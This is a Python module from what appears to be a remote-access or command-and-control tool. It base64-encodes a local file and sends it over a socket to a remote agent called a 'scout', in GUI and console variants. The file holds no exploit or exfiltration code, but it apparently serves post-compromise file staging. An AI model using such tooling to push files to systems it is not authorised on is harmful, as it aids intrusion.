# GUI + CUI
# done
import library.modules.recv_all as recv_all
from base64 import b64encode
from ntpath import basename
import library.modules.config as config
import library.modules.send_all as send_all

config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify
    import library.modules.log as log


def main(sock, filepath):
    if interface == "GUI":
        try:
            filepath = filepath.split(' ', 1)[1]
            log.log_normal("Reading file...")
            with open(filepath, 'rb') as f:
                data = f.read()
            log.log_normal("Sending file data to scout...")
            send_all.main(sock, 'g upload ' + basename(filepath) + ' ' + b64encode(data).decode())
            response = recv_all.main(sock)
            log.log_normal("Message from scout: " + response)
            return jsonify({"output": "Success", "output_message": "Command Output", "data": response})
        except IOError:
            log.log_error("File does not exist, cannot upload")
            return jsonify(
                {"output": "Success", "output_message": "Command Output",
                 "data": "[!]Error while uploading: File does not exist, cannot upload"})
        except IndexError:
            log.log_error("Please supply valid arguments for the command you are running")
            return jsonify(
                {"output": "Success", "output_message": "Command Output",
                 "data": "[!]Error while uploading: Please supply valid arguments for the command you are running"})
        except Exception as e:
            log.log_error("Error while uploading file : " + str(e))
            return jsonify({"output": "Success", "output_message": "Command Output",
                            "data": "[!]Error while uploading: " + str(e)})
    elif interface == "CUI":
        try:
            filepath = filepath.split(' ', 1)[1]
            print(config.inf + 'Reading file...')
            with open(filepath, 'rb') as f:
                data = f.read()
            print(config.inf + 'Sending file data to scout...')
            send_all.main(sock, 'c upload ' + basename(filepath) + ' ' + b64encode(data).decode())
            response = recv_all.main(sock)
            print(response)
        except IOError:
            print(config.neg + 'File does not exist, cannot upload')
        except IndexError:
            print(config.neg + 'Please supply valid arguments for the command you are running')
        except Exception as e:
            print(config.neg + 'Error while uploading file : ' + str(e))
